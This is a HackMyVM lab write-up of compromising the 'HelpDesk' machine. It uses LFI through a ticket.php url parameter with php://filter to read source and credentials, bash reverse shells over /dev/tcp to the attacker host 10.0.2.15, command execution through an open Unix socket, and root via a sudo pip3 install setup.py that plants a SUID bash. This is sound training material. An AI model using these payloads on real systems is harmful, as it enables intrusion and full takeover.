# HelpDesk

## Recon

```bash
└─$ ip -brief a s
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             10.0.2.15/24 fe80::c8d0:1e99:530b:fb94/64
br-eba2cf633d98  DOWN           172.20.0.1/16
br-18249e3b021e  DOWN           172.18.0.1/16
docker0          DOWN           172.17.0.1/16
br-d813d3f8a538  DOWN           172.19.0.1/16

└─$ sudo netdiscover -r 10.0.2.15/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.3        08:00:27:44:d6:c1      1      60  PCS Systemtechnik GmbH
 10.0.2.23       08:00:27:6b:f2:d0      1      60  PCS Systemtechnik GmbH
```

Since I just spun up the target machine the IP should be the last one 

::: details nmap_scan.log
```log
Open 10.0.2.23:22
Open 10.0.2.23:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.23

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b4:bc:42:f6:d0:a7:0d:fd:71:01:3d:8a:c5:0c:ac:e3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFJHuRlbJeBiLn2NGW7GU+dwMOOTUFnjCc1KPur/SMcdDpqyEBKhU+SANCgu/54y28qGDb/Fb86hQ6yHLqkewUg=
|   256 71:90:08:58:14:04:09:d5:cf:31:ee:87:17:ad:29:8f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHKjYWNGxvGg0iwqgnnfgj783/thoz0kS6cri2XvhvEX
80/tcp open  http    syn-ack Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: HelpDesk Ticket System
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

> I added `helpdesk.hmv` as DNS record for ease of access.

Main page is **under maintenance**

![writeup.png](/assets/pentest/hackmyvm/helpdesk/writeup.png)

### Fuzz

Fuzz
```bash
└─$ feroxbuster -u http://helpdesk.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -n -D -C 404,403,400 --dont-scan js,css,png,jpeg,jpg,gif
200      GET       56l      138w     1290c http://helpdesk.hmv/
301      GET        7l       20w      237c http://helpdesk.hmv/helpdesk => http://helpdesk.hmv/helpdesk/
200      GET       56l      138w     1290c http://helpdesk.hmv/index.php
301      GET        7l       20w      239c http://helpdesk.hmv/javascript => http://helpdesk.hmv/javascript/
200      GET       86l      167w     1819c http://helpdesk.hmv/login.php
302      GET        0l        0w        0c http://helpdesk.hmv/panel.php => login.php
200      GET        5l       28w      204c http://helpdesk.hmv/ticket.php
[####################] - 7s      7315/7315    0s      found:7       errors:0
[####################] - 6s      7273/7273    1129/s  http://helpdesk.hmv/ 
```

Login page doesn't seem bypassable, no creds or injections.

![writeup-1.png](/assets/pentest/hackmyvm/helpdesk/writeup-1.png)

### Tickets

Ticket on the other hand looks suspicious as it's accessible without authorization. Fuzz for possible parameters to view tickets: 
```bash
└─$ ffuf -u "http://helpdesk.hmv/ticket.php?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fw 24
url                     [Status: 200, Size: 270, Words: 30, Lines: 5, Duration: 21ms]
:: Progress: [6453/6453] :: Job [1/1] :: 1000 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

![writeup-2.png](/assets/pentest/hackmyvm/helpdesk/writeup-2.png)

### LFI

LFI is possible via URL parameter [http://helpdesk.hmv/ticket.php?url=file:///etc/passwd](http://helpdesk.hmv/ticket.php?url=file:///etc/passwd)

![writeup-3.png](/assets/pentest/hackmyvm/helpdesk/writeup-3.png)

We can also use PHP Wrappers to read PHP code, the login page has hardcoded credentials
```php
└─$ curl 'http://helpdesk.hmv/ticket.php?url=php://filter/convert.base64-encode/resource=/var/www/html/login.php' -s | html2text | grep -v '\*' | base64 -d
<?php
session_start();

// Enable PHP error display for debugging (remove in production)
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Stored credentials
$stored_user = 'helpdesk';

// SHA-512 hash for password: ticketmaster
$stored_hash = '$6$ABC123$fLo2MacCV.XBQeRZtHWL2297q/fUBs/b8gOmvLGuiz7wDgl3MSWcOOSKnTbaNPoUMCmEpY1dlwuPKbAtIuoo6.';

// Handle login
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';

    if ($user === $stored_user && crypt($pass, $stored_hash) === $stored_hash) {
        $_SESSION['auth'] = true;
        header("Location: panel.php");
        exit;
    } else {
        $error = "Invalid username or password.";
    }
}
?>
...
```

> Creds: `helpdesk:ticketmaster`

### RCE

We are free to execute any command

![writeup-4.png](/assets/pentest/hackmyvm/helpdesk/writeup-4.png)

## Reverse Shell (www-data)

[https://www.revshells.com](https://www.revshells.com)

Get reverse shell
```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'
```

```bash
└─$ listen # rlwrap nc -lvnp4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.23:35072.
bash: cannot set terminal process group (928): Inappropriate ioctl for device
bash: no job control in this shell
www-data@helpdesk:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@helpdesk:/var/www/html$ ls -alh
total 32K
drwxr-xr-x 3 www-data www-data 4.0K Aug 16 16:08 .
drwxr-xr-x 3 root     root     4.0K Aug 16 14:52 ..
-rwxr-xr-x 1 www-data www-data  296 Aug 16 15:14 debug.php
drwxr-xr-x 2 www-data www-data 4.0K Aug 16 15:11 helpdesk
-rwxr-xr-x 1 www-data www-data 1.3K Aug 16 15:14 index.php
-rw-r--r-- 1 root     root     2.6K Aug 16 15:28 login.php
-rw-r--r-- 1 root     root     2.2K Aug 16 15:29 panel.php
-rwxr-xr-x 1 www-data www-data  505 Aug 16 16:08 ticket.php

www-data@helpdesk:/var/www/html$ cat debug.php
<?php
echo "<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
h2 { color: #0ff; }
</style>";
echo "<h2>Debug Mode Enabled</h2>";
echo "<pre>[DEBUG] Connecting to internal dev server...\n";
echo "[DEBUG] Using creds: service_user:SuperSecretDev123!</pre>";
?>
```

I saw MySQL and I tried username/credentials combinations we got so far, but nothing.
```bash
www-data@helpdesk:/var/www/html$ ss -tunlp4
Netid     State      Recv-Q     Send-Q            Local Address:Port          Peer Address:Port    Process
udp       UNCONN     0          0                    127.0.0.54:53                 0.0.0.0:*
udp       UNCONN     0          0                 127.0.0.53%lo:53                 0.0.0.0:*
udp       UNCONN     0          0              10.0.2.23%enp0s3:68                 0.0.0.0:*
tcp       LISTEN     0          70                    127.0.0.1:33060              0.0.0.0:*
tcp       LISTEN     0          4096                 127.0.0.54:53                 0.0.0.0:*
tcp       LISTEN     0          4096                    0.0.0.0:22                 0.0.0.0:*
tcp       LISTEN     0          151                   127.0.0.1:3306               0.0.0.0:*
tcp       LISTEN     0          5                     127.0.0.1:8000               0.0.0.0:*
tcp       LISTEN     0          4096              127.0.0.53%lo:53                 0.0.0.0:*
```

I didn't see port 80 used so I assumed 8000 was the vulnerable application, but nope 
```bash
www-data@helpdesk:/var/www/html$ curl 0:8000
Internal Dev API - v0.2
For authorized service use only.
```

Hmmm... Auth with GET, POST or Basic Auth fails...
```bash
www-data@helpdesk:/var/www/html$ curl '0:8000?username=service_user&password=SuperSecretDev123!'
404 - Not Found
www-data@helpdesk:/var/www/html$ curl '0:8000/?username=service_user&password=SuperSecretDev123!'
404 - Not Found
www-data@helpdesk:/var/www/html$ curl 0:8000 -d 'username=service_user&password=SuperSecretDev123!'
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 501</p>
        <p>Message: Unsupported method ('POST').</p>
        <p>Error code explanation: 501 - Server does not support this operation.</p>
    </body>
</html>
www-data@helpdesk:/var/www/html$ curl 0:8000 -u 'service_user:SuperSecretDev123!'
Internal Dev API - v0.2
For authorized service use only.
```

Usually custom scripts are stored inside `/opt`
```python
www-data@helpdesk:/opt/dev_server$ cat server.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Internal Dev API - v0.2\n")
            self.wfile.write(b"For authorized service use only.\n")

        elif self.path == "/dump":
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"[DEV DEBUG] Username: helpdesk\n")
            self.wfile.write(b"[DEV DEBUG] Hash: $6$rounds=10000$ABC123$8TZKHwbjkGZ.LfK/...REDACTED...\n")

        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"404 - Not Found\n")

if __name__ == "__main__":
    print("Starting internal dev server on 127.0.0.1:8000...")
    httpd = HTTPServer(('127.0.0.1', 8000), Handler)
    httpd.serve_forever()
```

The found password doesn't match the hash in the server, if you make request to server you still see REDACTED part...
```bash
www-data@helpdesk:/opt/dev_server$ python3 -c 'print(__import__("crypt").crypt("SuperSecretDev123!", "$6$rounds=10000$ABC123$"))'
$6$rounds=10000$ABC123$ERRoe/.lQMRuS.2x0kO/S1OA/IHB9auOsJikozMXLtIvMeDTuyfhndaWpT0Aw6hMG3wWVLeaXDbZEmPzcEYjY.
```

We should skip hash cracking if possible, there's also another service in `/opt` called `helpdesk-socket`
```bash
www-data@helpdesk:/opt/helpdesk-socket$ ls -alh
total 16K
drwxr-xr-x 2 helpdesk helpdesk 4.0K Aug 26 16:21 .
drwxr-xr-x 4 root     root     4.0K Aug 16 15:32 ..
-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh
srwxrwxrwx 1 helpdesk helpdesk    0 Aug 26 16:21 helpdesk.sock
-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh
www-data@helpdesk:/opt/helpdesk-socket$ cat serve.sh
#!/bin/bash

SOCKET="/opt/helpdesk-socket/helpdesk.sock"

[ -e "$SOCKET" ] && rm "$SOCKET"

/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh
www-data@helpdesk:/opt/helpdesk-socket$ file helpdesk.sock
helpdesk.sock: socket
www-data@helpdesk:/opt/helpdesk-socket$ cat handler.sh
#!/bin/bash
# Simple parser — executes anything sent over the socket (dangerous!)
read cmd
echo "[HelpDesk Automation] Executing: $cmd"
/bin/bash -c "$cmd"
```

```bash
www-data@helpdesk:/opt/helpdesk-socket$ man nc
...
       -U      Use Unix-domain sockets.  Cannot be used together with -F or -x.  On Linux, if the name starts with an at symbol (`@') it is read as an abstract namespace socket: the leading `@' is replaced
               with a NUL byte before binding or connecting.  For details, see unix(7).
...
www-data@helpdesk:/opt/helpdesk-socket$ echo id | nc -U /opt/helpdesk-socket/helpdesk.sock
[HelpDesk Automation] Executing: id
uid=1001(helpdesk) gid=1001(helpdesk) groups=1001(helpdesk)
```

## Reverse Shell (helpdesk)

```bash
www-data@helpdesk:/opt/helpdesk-socket$ echo '/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1' | nc -U /opt/helpdesk-socket/helpdesk.sock
```

Upgrade shell to be more interactive
```bash
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.23] 56046
bash: cannot set terminal process group (721): Inappropriate ioctl for device
bash: no job control in this shell
helpdesk@helpdesk:/$ python3 -c 'import pty;pty.spawn("/bin/bash")' # Spawn PTY
helpdesk@helpdesk:/$ ^Z # Background the shell
zsh: suspended  nc -lvnp 4444

└─$ stty raw -echo;fg; # *Upgrade
[1]  + continued  nc -lvnp 4444

helpdesk@helpdesk:/$ stty rows 47 cols 211;export TERM=xterm # Make it pretty
```

## Privilege Escalation (root)

Helpdesk can install any Python packages without password as root.
```bash
helpdesk@helpdesk:/$ sudo -l
Matching Defaults entries for helpdesk on helpdesk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User helpdesk may run the following commands on helpdesk:
    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *
```

[https://gtfobins.github.io/gtfobins/pip](https://gtfobins.github.io/gtfobins/pip)

```bash
helpdesk@helpdesk:/$ TF=$(mktemp -d)
helpdesk@helpdesk:/$ echo 'import os; os.system("install -m4777 /bin/bash /tmp/rootbash")' > $TF/setup.py
helpdesk@helpdesk:/$ sudo pip install $TF
[sudo] password for helpdesk:
sudo: a password is required
helpdesk@helpdesk:/$ sudo pip3 install --break-system-packages $TF
Processing /tmp/tmp.nLmAhywWRd
  Preparing metadata (setup.py) ... done
ERROR: No .egg-info directory found in /tmp/pip-pip-egg-info-jfkkwttn
helpdesk@helpdesk:/$ /tmp/rootbash -p
rootbash-5.2# id
uid=1001(helpdesk) gid=1001(helpdesk) euid=0(root) groups=1001(helpdesk)

rootbash-5.2# find /root /home -type f -name '*.txt' -exec md5sum {} \;
0039c4e0ba4b9b5ad9e05774757eeb72  /root/root.txt
d1d5ffd84ccd84d34f3b1d103fca02d5  /home/helpdesk/user.txt
```